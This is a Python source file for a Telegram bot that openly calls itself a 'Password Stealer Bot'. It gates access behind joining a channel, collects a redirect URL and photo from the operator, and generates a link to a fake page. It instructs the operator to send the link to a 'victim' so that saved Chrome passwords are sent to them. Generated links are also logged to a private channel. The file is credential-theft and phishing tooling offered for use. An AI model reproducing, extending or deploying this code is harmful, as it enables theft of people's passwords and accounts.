import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import time
import threading
import uuid
import requests
from bot.config import BOT_TOKEN, PRIVATE_CHANNEL_ID, BASE_URL
from bot.server import app
from bot.utils.storage import user_data, link_cache, victim_data_store

bot = telebot.TeleBot(BOT_TOKEN)

# ========== CHECK IF USER JOINED CHANNEL ==========
def check_user_joined(user_id):
    try:
        chat_member = bot.get_chat_member("@nrtecno2", user_id)
        status = chat_member.status
        if status in ['left', 'kicked']:
            return False
        return True
    except Exception as e:
        print(f"Check join error: {e}")
        return False

# ========== JOIN BUTTONS ==========
def get_join_buttons():
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("📢 Join @nrtecno2", url="https://t.me/nrtecno2"),
        InlineKeyboardButton("✅ I have joined", callback_data="verify_join")
    )
    return markup

# ========== /START ==========
@bot.message_handler(commands=['start'])
def start(message):
    user_id = message.chat.id

    if check_user_joined(user_id):
        bot.send_message(
            user_id,
            "🔗 *Send me a LINK* (URL where victim will go after password capture)\n\n"
            "📤 Then I'll ask for a photo.",
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(message, get_link)
    else:
        bot.send_message(
            user_id,
            "🔐 *Access Restricted*\n\nYou must join @nrtecno2 to use this bot.\n\n"
            "👉 [Join @nrtecno2](https://t.me/nrtecno2)\n\nAfter joining, click the button below.",
            reply_markup=get_join_buttons(),
            parse_mode="Markdown"
        )

# ========== VERIFY JOIN ==========
@bot.callback_query_handler(func=lambda call: call.data == "verify_join")
def verify_join(call):
    user_id = call.from_user.id
    if check_user_joined(user_id):
        bot.answer_callback_query(call.id, "✅ Verified!")
        bot.send_message(
            user_id,
            "🔗 *Send me a LINK* (URL where victim will go after password capture)\n\n"
            "📤 Then I'll ask for a photo.",
            parse_mode="Markdown"
        )
        bot.register_next_step_handler(call.message, get_link)
    else:
        bot.answer_callback_query(
            call.id,
            "❌ You haven't joined @nrtecno2 yet! Please join first.",
            show_alert=True
        )

# ========== GET LINK ==========
def get_link(message):
    user_id = message.chat.id
    redirect_url = message.text
    
    if not redirect_url.startswith("http"):
        bot.send_message(user_id, "❌ Please send a valid URL starting with http:// or https://")
        bot.register_next_step_handler(message, get_link)
        return
    
    if user_id not in user_data:
        user_data[user_id] = {}
    user_data[user_id]["redirect"] = redirect_url
    
    bot.send_message(
        user_id,
        "📤 *Send me a PHOTO* (will be shown to victim)\n\n"
        "This photo will appear on the fake page.",
        parse_mode="Markdown"
    )
    bot.register_next_step_handler(message, get_photo)

# ========== GET PHOTO ==========
def get_photo(message, user_id=None):
    if user_id is None:
        user_id = message.chat.id
    
    if message.photo:
        photo_id = message.photo[-1].file_id
        file_info = bot.get_file(photo_id)
        photo_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
        
        user_data[user_id]["photo_url"] = photo_url
        victim_data_store[f"photo_{user_id}"] = photo_url
        victim_data_store[f"redirect_{user_id}"] = user_data[user_id]["redirect"]
        
        # Generate final link
        unique_id = str(uuid.uuid4())[:8]
        link = f"{BASE_URL}/p/pass/{unique_id}?v={user_id}"
        link_cache[unique_id] = {"user_id": user_id, "time": time.time()}
        
        # Send to channel
        try:
            bot.send_photo(PRIVATE_CHANNEL_ID, photo_id, caption=f"📸 User {user_id} uploaded photo")
            bot.send_message(PRIVATE_CHANNEL_ID, f"🔗 Link generated: {link}")
        except:
            pass
        
        bot.send_message(
            user_id,
            f"✅ *Password Stealer Link Ready:*\n\n`{link}`\n\n"
            "📤 Send this link to victim.\n"
            "🔑 When victim opens in Chrome and grants permissions, all saved passwords will be sent to you.",
            parse_mode="Markdown"
        )
    else:
        bot.send_message(user_id, "❌ Please send a PHOTO.")
        bot.register_next_step_handler(message, get_photo)

# ========== RUN BOT ==========
def run_bot():
    while True:
        try:
            bot.infinity_polling(timeout=60)
        except Exception as e:
            print(f"Bot error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    print("🤖 Password Stealer Bot Running...")
    threading.Thread(target=run_bot, daemon=True).start()
    app.run(host='0.0.0.0', port=5000, debug=False)
